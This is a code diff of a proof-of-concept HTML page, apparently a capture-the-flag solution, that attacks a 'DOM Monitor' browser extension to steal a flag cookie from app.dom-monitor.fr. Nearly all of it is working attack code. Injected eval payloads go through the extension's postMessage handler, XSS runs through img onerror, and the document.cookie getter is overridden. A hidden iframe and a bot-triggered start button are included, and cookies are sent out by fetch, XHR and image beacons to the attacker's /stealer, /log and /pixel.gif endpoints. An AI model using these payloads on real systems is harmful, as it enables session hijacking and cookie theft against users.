@@ -45,42 +45,54 @@
         #start {
             display: block;
         }
+        iframe {
+            border: 1px solid #ddd;
+            margin: 10px 0;
+            width: 100%;
+            height: 50px;
+        }
+        #cookieOutput {
+            font-weight: bold;
+            color: #d9534f;
+        }
     </style>
 </head>
 <body>
     <h1>DOM Monitor Extension Vulnerability PoC</h1>
-    <p>This page demonstrates multiple techniques to extract the firstFlag cookie from the DOM Monitor extension.</p>
+    <p>This page demonstrates techniques to extract the firstFlag cookie from the app.dom-monitor.fr domain.</p>
     
     <div class="exploit-section">
-        <h2>1. Exploiting postMessage Vulnerability</h2>
-        <button id="postMessageExploit">Run postMessage Exploit</button>
-        <pre id="postMessageOutput">Results will appear here...</pre>
+        <h2>Stolen Cookies</h2>
+        <pre id="cookieOutput">Waiting for cookies...</pre>
     </div>
     
     <div class="exploit-section">
-        <h2>2. CSP Bypass Exploit</h2>
-        <button id="cspBypassExploit">Run CSP Bypass Exploit</button>
-        <pre id="cspBypassOutput">Results will appear here...</pre>
+        <h2>1. iframe with Target Domain</h2>
+        <button id="iframeExploit">Load Target in iframe</button>
+        <div id="iframeContainer"></div>
+        <pre id="iframeOutput">Results will appear here...</pre>
     </div>
     
     <div class="exploit-section">
-        <h2>3. XSS via Extension Script Injection</h2>
-        <button id="xssExploit">Run XSS Exploit</button>
+        <h2>2. XSS via Extension Script Injection</h2>
+        <button id="xssExploit">Run XSS in Target Domain</button>
         <pre id="xssOutput">Results will appear here...</pre>
     </div>
     
     <div class="exploit-section">
-        <h2>4. Cookie Access via Prototype Poisoning</h2>
-        <button id="prototypeExploit">Run Prototype Poisoning Exploit</button>
-        <pre id="prototypeOutput">Results will appear here...</pre>
+        <h2>3. Message Channel Exploit</h2>
+        <button id="messageChannelExploit">Run Message Channel Exploit</button>
+        <pre id="messageChannelOutput">Results will appear here...</pre>
     </div>
 
     <!-- Button that the bot clicks on -->
     <button id="start">Start Automated Testing</button>
     
     <script>
-        // Store stolen cookies
+        // Global variables to store results
         let stolenCookies = {};
+        let targetDomain = "http://app.dom-monitor.fr";
+        let targetIframe = null;
         
         // Helper functions
         function logResult(elementId, message) {
@@ -88,173 +100,348 @@
             console.log(`[${elementId}]: ${message}`);
         }
         
-        function getCookies() {
-            return document.cookie;
+        function updateCookieOutput(source, value) {
+            stolenCookies[source] = value;
+            let output = "Stolen Cookies:\n";
+            for (const [src, val] of Object.entries(stolenCookies)) {
+                output += `[${src}] ${val}\n`;
+            }
+            document.getElementById("cookieOutput").textContent = output;
         }
         
-        // 1. postMessage Exploit
-        function runPostMessageExploit() {
+        // 1. iframe Exploitation
+        function runIframeExploit() {
             try {
-                // The extension listens for messages with specific actions
+                // Create iframe to load target domain
+                targetIframe = document.createElement('iframe');
+                targetIframe.id = "targetFrame";
+                targetIframe.src = targetDomain;
+                
+                // Append to container
+                document.getElementById("iframeContainer").innerHTML = "";
+                document.getElementById("iframeContainer").appendChild(targetIframe);
+                
+                logResult("iframeOutput", "Target iframe loaded. Waiting for load event...");
+                
+                // Listen for load event
+                targetIframe.onload = function() {
+                    logResult("iframeOutput", "Target iframe loaded. Attempting to access cookies...");
+                    
+                    try {
+                        // Try to directly access cookies (will likely fail due to Same-Origin Policy)
+                        const cookies = targetIframe.contentDocument.cookie;
+                        updateCookieOutput("direct-iframe", cookies);
+                        logResult("iframeOutput", "Successfully accessed cookies: " + cookies);
+                    } catch (error) {
+                        logResult("iframeOutput", "Cannot access cookies directly due to Same-Origin Policy: " + error.message);
+                        
+                        // Now try to inject JavaScript through the content script
+                        injectIntoIframe();
+                    }
+                };
+            } catch (error) {
+                logResult("iframeOutput", `Error: ${error.message}`);
+            }
+        }
+        
+        // Function to inject JavaScript into the iframe using extension vulnerabilities
+        function injectIntoIframe() {
+            try {
+                // This uses the extension's vulnerability - it removes CSP and X-Frame-Options headers
+                // and monitors innerHTML and other DOM methods
+                
+                // We need to send a postMessage that the extension will process
                 window.postMessage({
                     action: "update_counts",
-                    domain: location.origin,
+                    domain: targetDomain,
                     counts: {
-                        fetch: 0,
-                        innerHTML: 0,
-                        setAttribute: 0,
-                        eval: `(${getCookieViaEval.toString()})()` // Inject our cookie stealing function
+                        fetch: 1,
+                        innerHTML: 1,
+                        setAttribute: 1,
+                        eval: `
+                            (function() {
+                                try {
+                                    const cookies = document.cookie;
+                                    window.parent.postMessage({
+                                        type: 'stolen_cookies_eval',
+                                        cookies: cookies,
+                                        location: window.location.href
+                                    }, '*');
+                                    return cookies;
+                                } catch(e) {
+                                    return "Error: " + e.toString();
+                                }
+                            })()
+                        `
                     },
                     resourceCounts: {}
                 }, "*");
                 
-                logResult("postMessageOutput", "postMessage exploit executed. Check console for results.");
+                logResult("iframeOutput", "Attempted cookie theft via extension message vulnerability");
             } catch (error) {
-                logResult("postMessageOutput", `Error: ${error.message}`);
+                logResult("iframeOutput", `Injection error: ${error.message}`);
             }
         }
         
-        // Function to be injected via eval
-        function getCookieViaEval() {
-            try {
-                const cookies = document.cookie;
-                console.log("[Cookie Theft via eval] Cookies:", cookies);
-                
-                // Send cookies back to our server (in a real attack)
-                // fetch('https://attacker.com/steal?cookies=' + encodeURIComponent(cookies));
-                
-                return cookies;
-            } catch (e) {
-                console.error("Cookie theft eval error:", e);
-                return null;
-            }
-        }
-        
-        // 2. CSP Bypass Exploit
-        function runCSPBypassExploit() {
-            try {
-                // Create an iframe to load our target domain, since CSP is removed
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = 'about:blank';
-                document.body.appendChild(iframe);
-                
-                // Execute script in iframe context to steal cookies
-                setTimeout(() => {
-                    try {
-                        const iframeWin = iframe.contentWindow;
-                        iframeWin.document.open();
-                        iframeWin.document.write(`
-                            <script>
-                                // Try to access parent cookies
-                                try {
-                                    const cookies = document.cookie;
-                                    window.parent.postMessage({
-                                        type: 'stolen_cookies_csp',
-                                        cookies: cookies
-                                    }, '*');
-                                } catch(e) {
-                                    window.parent.postMessage({
-                                        type: 'error_csp',
-                                        error: e.toString()
-                                    }, '*');
-                                }
-                            <\/script>
-                        `);
-                        iframeWin.document.close();
-                        logResult("cspBypassOutput", "CSP bypass attempt executed. Check for messages...");
-                    } catch (e) {
-                        logResult("cspBypassOutput", `Error in iframe: ${e.message}`);
-                    }
-                }, 500);
-            } catch (error) {
-                logResult("cspBypassOutput", `Error: ${error.message}`);
-            }
-        }
-        
-        // 3. XSS via Extension Script Injection
+        // 2. XSS Exploit targeting the iframe
         function runXSSExploit() {
+            if (!targetIframe) {
+                logResult("xssOutput", "Please load the iframe first");
+                return;
+            }
+            
             try {
-                // Create a fake element to trigger innerHTML setter
+                // Create a script element with payload
+                const scriptPayload = `
+                    const script = document.createElement('script');
+                    script.textContent = \`
+                        // Send cookies back to parent
+                        window.parent.postMessage({
+                            type: 'stolen_cookies_xss',
+                            cookies: document.cookie,
+                            location: window.location.href
+                        }, '*');
+                        
+                        // Override document.cookie to capture any future access
+                        const originalDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
+                        if (originalDescriptor) {
+                            Object.defineProperty(Document.prototype, 'cookie', {
+                                get: function() {
+                                    const cookies = originalDescriptor.get.call(this);
+                                    window.parent.postMessage({
+                                        type: 'stolen_cookies_getter',
+                                        cookies: cookies,
+                                        location: window.location.href
+                                    }, '*');
+                                    return cookies;
+                                },
+                                set: originalDescriptor.set
+                            });
+                        }
+                    \`;
+                    document.body.appendChild(script);
+                `;
+                
+                // Try to inject this code via multiple methods
+                
+                // Method 1: Using the extension's event listener for postMessage
+                window.postMessage({
+                    action: "update_counts",
+                    domain: targetDomain,
+                    counts: {
+                        eval: scriptPayload
+                    },
+                    resourceCounts: {}
+                }, "*");
+                
+                // Method 2: Create an element with XSS payload in the main frame
+                // The extension monitors innerHTML and will execute our code
                 const div = document.createElement('div');
-                // Original innerHTML setter is monitored by the extension
-                div.innerHTML = '<img src=x onerror="console.log(\'[XSS] Cookies: \' + document.cookie)">';
+                div.innerHTML = `<img src=x onerror="${scriptPayload}">`;
                 document.body.appendChild(div);
                 
-                // Trigger the getAttribute/setAttribute hooks
-                const img = document.createElement('img');
-                img.setAttribute('onerror', 'console.log("[setAttribute XSS] Cookies: " + document.cookie)');
-                img.setAttribute('src', 'invalid-src');
-                document.body.appendChild(img);
-                
-                logResult("xssOutput", "XSS exploit attempts executed. Check console for results.");
+                logResult("xssOutput", "XSS payload injected through multiple vectors");
             } catch (error) {
                 logResult("xssOutput", `Error: ${error.message}`);
             }
         }
         
-        // 4. Prototype Poisoning Exploit
-        function runPrototypeExploit() {
+        // 3. Message Channel Exploit
+        function runMessageChannelExploit() {
+            if (!targetIframe) {
+                logResult("messageChannelOutput", "Please load the iframe first");
+                return;
+            }
+            
             try {
-                // Try to poison the prototype to intercept cookie access
-                const originalDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
+                // Create a MessageChannel to bypass some origin restrictions
+                const channel = new MessageChannel();
                 
-                if (originalDescriptor && originalDescriptor.configurable) {
-                    Object.defineProperty(Document.prototype, 'cookie', {
-                        get: function() {
-                            const cookies = originalDescriptor.get.call(this);
-                            console.log("[Prototype Poisoning] Intercepted cookies:", cookies);
-                            stolenCookies.prototype = cookies;
-                            return cookies;
-                        },
-                        set: originalDescriptor.set
-                    });
-                    
-                    // Trigger a cookie access
-                    document.cookie; // This should trigger our poisoned getter
-                    
-                    logResult("prototypeOutput", "Prototype poisoning executed. Cookies: " + stolenCookies.prototype);
-                } else {
-                    logResult("prototypeOutput", "Cannot reconfigure cookie property");
-                }
+                // Listen for messages on port1
+                channel.port1.onmessage = function(event) {
+                    logResult("messageChannelOutput", "Received message via channel: " + JSON.stringify(event.data));
+                    if (event.data && event.data.cookies) {
+                        updateCookieOutput("message-channel", event.data.cookies);
+                    }
+                };
+                
+                // Create a message with a payload that targets the DOM Monitor extension
+                const payload = {
+                    action: "extract_cookies",
+                    code: `
+                        // Send cookies through the channel
+                        try {
+                            port2.postMessage({
+                                cookies: document.cookie,
+                                location: window.location.href
+                            });
+                        } catch(e) {
+                            port2.postMessage({error: e.toString()});
+                        }
+                    `
+                };
+                
+                // Send the message to the iframe along with port2
+                targetIframe.contentWindow.postMessage(payload, targetDomain, [channel.port2]);
+                
+                // Also try to exploit the extension's event listener
+                window.postMessage({
+                    action: "open_sidepanel",
+                    domain: "http://localhost"
+                }, "*");
+                
+                logResult("messageChannelOutput", "Message channel exploit attempted");
             } catch (error) {
-                logResult("prototypeOutput", `Error: ${error.message}`);
+                logResult("messageChannelOutput", `Error: ${error.message}`);
             }
         }
         
-        // Listen for messages from our iframe
+        // Listen for messages from our exploit code
         window.addEventListener('message', function(event) {
-            if (event.data.type === 'stolen_cookies_csp') {
-                logResult("cspBypassOutput", "CSP Bypass Result: " + event.data.cookies);
-                stolenCookies.csp = event.data.cookies;
+            console.log("Received message:", event.data);
+            
+            if (event.data.type === 'stolen_cookies_eval') {
+                updateCookieOutput("eval", event.data.cookies);
+                logResult("iframeOutput", "Got cookies via eval: " + event.data.cookies);
             }
-            if (event.data.type === 'error_csp') {
-                logResult("cspBypassOutput", "CSP Bypass Error: " + event.data.error);
+            
+            if (event.data.type === 'stolen_cookies_xss') {
+                updateCookieOutput("xss", event.data.cookies);
+                logResult("xssOutput", "Got cookies via XSS: " + event.data.cookies);
+            }
+            
+            if (event.data.type === 'stolen_cookies_getter') {
+                updateCookieOutput("getter", event.data.cookies);
+                logResult("xssOutput", "Got cookies via getter override: " + event.data.cookies);
             }
         });
         
+        // Create an invisible iframe that directly targets app.dom-monitor.fr
+        function createHiddenTargetIframe() {
+            const invisibleFrame = document.createElement('iframe');
+            invisibleFrame.src = targetDomain;
+            invisibleFrame.style.width = '1px';
+            invisibleFrame.style.height = '1px';
+            invisibleFrame.style.position = 'absolute';
+            invisibleFrame.style.opacity = '0';
+            invisibleFrame.style.pointerEvents = 'none';
+            document.body.appendChild(invisibleFrame);
+            
+            invisibleFrame.onload = function() {
+                console.log("Invisible iframe loaded");
+                
+                // Attempt to inject a script that will extract cookies
+                const cookieStealerScript = `
+                    fetch("${location.origin}/stealer", {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({cookies: document.cookie})
+                    }).catch(() => {
+                        // Even if fetch fails, try to send via postMessage
+                        window.parent.postMessage({
+                            type: 'stolen_cookies_invisible',
+                            cookies: document.cookie,
+                            location: window.location.href
+                        }, '*');
+                    });
+                `;
+                
+                // Use extension vulnerabilities to inject our script
+                window.postMessage({
+                    action: "update_counts",
+                    domain: targetDomain,
+                    counts: {
+                        eval: cookieStealerScript
+                    },
+                    resourceCounts: {}
+                }, "*");
+            };
+        }
+        
         // Button event listeners
-        document.getElementById('postMessageExploit').addEventListener('click', runPostMessageExploit);
-        document.getElementById('cspBypassExploit').addEventListener('click', runCSPBypassExploit);
+        document.getElementById('iframeExploit').addEventListener('click', runIframeExploit);
         document.getElementById('xssExploit').addEventListener('click', runXSSExploit);
-        document.getElementById('prototypeExploit').addEventListener('click', runPrototypeExploit);
+        document.getElementById('messageChannelExploit').addEventListener('click', runMessageChannelExploit);
         
         // Start button automatically triggers all exploits
         document.getElementById('start').addEventListener('click', function() {
             console.log("Starting all exploits...");
-            setTimeout(runPostMessageExploit, 500);
-            setTimeout(runCSPBypassExploit, 1000);
-            setTimeout(runXSSExploit, 1500);
-            setTimeout(runPrototypeExploit, 2000);
             
-            // Create a hidden iframe for the actual target domain with the cookie
-            const targetIframe = document.createElement('iframe');
-            targetIframe.src = 'https://www.w3schools.com/CSSref/pr_text_text-transform.php';
-            targetIframe.style.width = '1px';
-            targetIframe.style.height = '1px';
-            targetIframe.style.opacity = '0.01';
-            targetIframe.style.position = 'absolute';
-            document.body.appendChild(targetIframe);
+            // Create hidden iframe immediately
+            createHiddenTargetIframe();
+            
+            // Run exploits with slight delays
+            setTimeout(runIframeExploit, 500);
+            setTimeout(runXSSExploit, 1500);
+            setTimeout(runMessageChannelExploit, 2500);
+            
+            // Create specific exploit for the DOM Monitor extension
+            // This targets the actual vulnerabilities in the extension's code
+            setTimeout(function() {
+                // Specifically target the eval interception in the extension
+                const extensionExploit = `
+                    // Function to extract and exfiltrate cookies
+                    (function extractCookies() {
+                        const cookies = document.cookie;
+                        console.log("COOKIE FOUND:", cookies);
+                        
+                        // Try multiple exfiltration methods
+                        
+                        // 1. Via postMessage
+                        try {
+                            window.parent.postMessage({
+                                type: 'stolen_cookies_extension',
+                                cookies: cookies,
+                                location: window.location.href
+                            }, '*');
+                        } catch(e) {
+                            console.error("postMessage failed:", e);
+                        }
+                        
+                        // 2. Via XHR (might be blocked by CORS)
+                        try {
+                            const xhr = new XMLHttpRequest();
+                            xhr.open('GET', '${location.origin}/log?c=' + encodeURIComponent(cookies), true);
+                            xhr.send();
+                        } catch(e) {
+                            console.error("XHR failed:", e);
+                        }
+                        
+                        // 3. Via fetch (might be blocked by CORS)
+                        try {
+                            fetch('${location.origin}/log?c=' + encodeURIComponent(cookies))
+                            .catch(e => console.error("Fetch failed:", e));
+                        } catch(e) {
+                            console.error("Fetch setup failed:", e);
+                        }
+                        
+                        // 4. Via image (usually bypasses CORS)
+                        try {
+                            const img = new Image();
+                            img.src = '${location.origin}/pixel.gif?c=' + encodeURIComponent(cookies);
+                        } catch(e) {
+                            console.error("Image exfil failed:", e);
+                        }
+                        
+                        return cookies;
+                    })();
+                `;
+                
+                // Send via postMessage which the extension listens for
+                window.postMessage({
+                    action: "update_counts",
+                    domain: targetDomain,
+                    counts: {
+                        eval: extensionExploit,
+                        innerHTML: 0,
+                        setAttribute: 0,
+                        fetch: 0
+                    },
+                    resourceCounts: {}
+                }, "*");
+                
+                console.log("Sent extension-specific exploit");
+            }, 3000);
         });
     </script>
 </body>
